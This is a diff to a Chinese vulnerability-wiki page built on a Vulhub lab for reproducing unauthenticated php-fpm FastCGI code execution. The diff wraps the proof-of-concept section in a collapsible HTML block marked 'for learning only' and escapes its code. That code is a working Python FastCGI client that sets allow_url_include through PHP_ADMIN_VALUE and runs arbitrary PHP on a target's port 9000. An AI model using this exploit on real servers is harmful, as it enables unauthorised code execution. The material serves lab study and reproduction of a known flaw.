@@ -25,8 +25,10 @@ Vulhub 编译及运行测试环境：
 ```
 docker-compose build
 docker-compose up -d
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 访问 `http://your-ip:9000/`
 
 ## 漏洞复现
@@ -134,10 +136,10 @@ class FastCGIClient:
         length = len(content)
         buf = bchr(FastCGIClient.__FCGI_VERSION) \
                + bchr(fcgi_type) \
-               + bchr((requestid >> 8) & 0xFF) \
-               + bchr(requestid & 0xFF) \
-               + bchr((length >> 8) & 0xFF) \
-               + bchr(length & 0xFF) \
+               + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \
+               + bchr(requestid &amp; 0xFF) \
+               + bchr((length &gt;&gt; 8) &amp; 0xFF) \
+               + bchr(length &amp; 0xFF) \
                + bchr(0) \
                + bchr(0) \
                + content
@@ -147,28 +149,28 @@ class FastCGIClient:
         nLen = len(name)
         vLen = len(value)
         record = b''
-        if nLen < 128:
+        if nLen &lt; 128:
             record += bchr(nLen)
         else:
-            record += bchr((nLen >> 24) | 0x80) \
-                      + bchr((nLen >> 16) & 0xFF) \
-                      + bchr((nLen >> 8) & 0xFF) \
-                      + bchr(nLen & 0xFF)
-        if vLen < 128:
+            record += bchr((nLen &gt;&gt; 24) | 0x80) \
+                      + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \
+                      + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \
+                      + bchr(nLen &amp; 0xFF)
+        if vLen &lt; 128:
             record += bchr(vLen)
         else:
-            record += bchr((vLen >> 24) | 0x80) \
-                      + bchr((vLen >> 16) & 0xFF) \
-                      + bchr((vLen >> 8) & 0xFF) \
-                      + bchr(vLen & 0xFF)
+            record += bchr((vLen &gt;&gt; 24) | 0x80) \
+                      + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \
+                      + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \
+                      + bchr(vLen &amp; 0xFF)
         return record + name + value
 
     def __decodeFastCGIHeader(self, stream):
         header = dict()
         header['version'] = bord(stream[0])
         header['type'] = bord(stream[1])
-        header['requestId'] = (bord(stream[2]) << 8) + bord(stream[3])
-        header['contentLength'] = (bord(stream[4]) << 8) + bord(stream[5])
+        header['requestId'] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3])
+        header['contentLength'] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5])
         header['paddingLength'] = bord(stream[6])
         header['reserved'] = bord(stream[7])
         return header
@@ -194,7 +196,7 @@ class FastCGIClient:
             print('connect failure! please check your fasctcgi-server !!')
             return
 
-        requestId = random.randint(1, (1 << 16) - 1)
+        requestId = random.randint(1, (1 &lt;&lt; 16) - 1)
         self.requests[requestId] = dict()
         request = b""
         beginFCGIRecordContent = bchr(0) \
@@ -254,7 +256,7 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.')
     parser.add_argument('host', help='Target host, such as 127.0.0.1')
     parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php')
-    parser.add_argument('-c', '--code', help='What php code your want to execute', default='<?php phpinfo(); exit; ?>')
+    parser.add_argument('-c', '--code', help='What php code your want to execute', default='&lt;?php phpinfo(); exit; ?&gt;')
     parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int)
 
     args = parser.parse_args()
@@ -285,8 +287,9 @@ if __name__ == '__main__':
         'PHP_ADMIN_VALUE': 'allow_url_include = On'
     }
     response = client.request(params, content)
-    print(force_text(response))
-```
+    print(force_text(response))</code></pre>
+
+</details>
 
 ![image-20220223183005475](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/language/images/202202231830519.png)
 
